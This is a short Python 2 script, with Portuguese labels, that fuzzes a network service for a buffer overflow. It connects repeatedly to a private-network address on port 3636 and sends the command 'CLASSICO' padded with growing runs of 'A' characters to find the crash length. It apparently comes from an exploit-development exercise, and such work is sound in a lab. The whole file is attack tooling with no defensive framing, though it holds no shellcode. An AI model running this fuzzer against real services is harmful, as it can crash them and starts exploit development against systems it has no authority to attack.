#!/usr/bin/python
import socket

IP="10.0.2.13"
PORTA=3636

for i in range(1,100):
        payload = "A" * (50 * i)

        buffer = "CLASSICO "
        buffer += payload

        print "Enviando %s bytes..." % (len(payload))

        r = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        r.connect((IP,PORTA))

        r.recv(1024)

        r.send(buffer)

        r.close()
